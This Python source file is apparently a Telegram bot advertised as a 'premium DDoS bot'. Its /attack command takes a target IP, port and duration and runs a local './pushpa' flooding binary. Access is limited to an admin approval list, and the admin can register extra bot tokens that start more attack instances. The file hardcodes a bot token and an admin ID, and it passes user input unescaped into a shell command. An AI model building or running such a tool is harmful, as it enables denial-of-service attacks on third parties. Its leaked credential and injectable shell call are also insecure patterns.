import asyncio
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, CallbackContext
import os
import json

TELEGRAM_BOT_TOKEN = '7819992909:AAHn51FAfPId42gmKUT5wPmCoyC4_g9OeN0'
ADMIN_USER_ID = 1662672529
APPROVED_IDS_FILE = 'approved_ids.txt'
APPROVED_BOTS_FILE = 'approved_bots.txt'
attack_in_progress = False

# Load approved IDs (users and groups) from file
def load_approved_ids():
    try:
        with open(APPROVED_IDS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_approved_ids(approved_ids):
    with open(APPROVED_IDS_FILE, 'w') as f:
        f.writelines(f"{id_}\n" for id_ in approved_ids)

# Load approved bot tokens from file
def load_approved_bots():
    try:
        with open(APPROVED_BOTS_FILE) as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_bots(approved_bots):
    with open(APPROVED_BOTS_FILE, 'w') as f:
        json.dump(approved_bots, f)

# Validate Telegram Bot Token
async def is_valid_bot_token(token):
    try:
        bot = Bot(token=token)
        await bot.get_me()
        return True
    except Exception:
        return False

approved_ids = load_approved_ids()
approved_bots = load_approved_bots()

# Helper function to check access
def is_approved_user_or_bot(chat_id, user_id):
    return str(chat_id) in approved_ids or str(user_id) in approved_ids or str(chat_id) in approved_bots.keys()

# Start command
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_approved_user_or_bot(chat_id, user_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are not authorized to use this bot.*", parse_mode='Markdown')
        return

    message = (
        "*𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐆𝐎𝐃x𝐂𝐇𝐄𝐀𝐓𝐒 𝐃𝐃𝐎𝐒  *\n"
        "*PRIMIUM DDOS BOT*\n"
        "*OWNER :- @GODxAloneBOY*\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Approve command to approve users and bot tokens
async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage » /approve [ID or Bot Token]*", parse_mode='Markdown')
        return

    target_id_or_token = args[0].strip()

    if ':' in target_id_or_token:  # Likely a Bot Token
        if await is_valid_bot_token(target_id_or_token):
            bot_username = (await Bot(target_id_or_token).get_me()).username
            approved_bots[target_id_or_token] = bot_username
            save_approved_bots(approved_bots)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*✅ Bot {bot_username} approved with token.*\n*Starting the bot...*",
                parse_mode='Markdown'
            )
            # Start the approved bot
            asyncio.create_task(start_approved_bot(target_id_or_token))
        else:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid Bot Token.*", parse_mode='Markdown')
    else:  # Assume it's a User or Group ID
        approved_ids.add(target_id_or_token)
        save_approved_ids(approved_ids)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id_or_token} approved.*", parse_mode='Markdown')

# Remove command to remove approved users or bot tokens
async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage » /remove [ID or Bot Token]*", parse_mode='Markdown')
        return

    target_id_or_token = args[0].strip()

    if target_id_or_token in approved_ids:
        approved_ids.discard(target_id_or_token)
        save_approved_ids(approved_ids)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id_or_token} removed.*", parse_mode='Markdown')
    elif target_id_or_token in approved_bots:
        bot_username = approved_bots.pop(target_id_or_token)
        save_approved_bots(approved_bots)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Bot {bot_username} removed.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID or Bot Token not found in approved list.*", parse_mode='Markdown')

# Attack command (only for approved users and groups)
async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    if not is_approved_user_or_bot(chat_id, user_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="* Please wait 3 to 5 minutes for the next attack.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*  example » /attack ip port time*", parse_mode='Markdown')
        return

    ip, port, time = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 ✅*\n"
        f"*⭐ Target » {ip}*\n"
        f"*⭐ Port » {port}*\n"
        f"*⭐ Time » {time} seconds*\n"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time, context))

# Run attack function
async def run_attack(chat_id, ip, port, time, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./pushpa {ip} {port} {time} 500",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 ✅*", parse_mode='Markdown')

# Start an approved bot instance
async def start_approved_bot(bot_token):
    application = Application.builder().token(bot_token).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

# Main function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()
